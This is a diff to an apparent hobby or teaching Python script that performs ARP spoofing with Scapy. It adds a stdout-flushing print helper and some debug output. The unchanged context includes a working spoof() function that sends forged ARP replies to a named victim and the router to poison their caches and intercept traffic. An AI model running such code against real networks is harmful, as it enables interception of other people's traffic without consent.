@@ -18,6 +18,14 @@ victimMAC = None
 routerMAC = None
 
 
+def print_f(string):
+    """This method is required because when this python file is called as a script
+    the prints don't appear and a flush is required """
+
+    print(string)
+    sys.stdout.flush()
+
+
 def grab_MAC(IP):
     """Manipulates the packet layers to obtain the MAC address from the returned values"""
 
@@ -36,7 +44,7 @@ def grab_MAC_Addresses():
 
     if victimMAC is not None and routerMAC is not None:
         loop = False
-        print("[*] MAC Addresses obtain successfully!")
+        print_f("[*] MAC Addresses obtain successfully!")
         print("[*] Router mac: \'", routerMAC, '\'')
         print("[*] Victim mac: \'", victimMAC, '\'')
     else:
@@ -49,7 +57,7 @@ def spoof(routerIP, victimIP):
     # Sends the arp replies
     #   "op = 2" - '2' is the opcode for a reply
 
-    print("[*] Spoofing")
+    print_f("[*] Spoofing")
     send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC), verbose=scapyVerbose)
     send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC), verbose=scapyVerbose)
 
@@ -101,6 +109,8 @@ def run():
 def valid_ip(ip_address):
     """This function uses regex to check if the IP address parameters are correct.
     It validates the range 0.0.0.0 -> 255.255.255.255"""
+
+    print("Checking ip: ", ip_address)
 
     # Regular expression pattern matching for IP addresses
     pattern = \
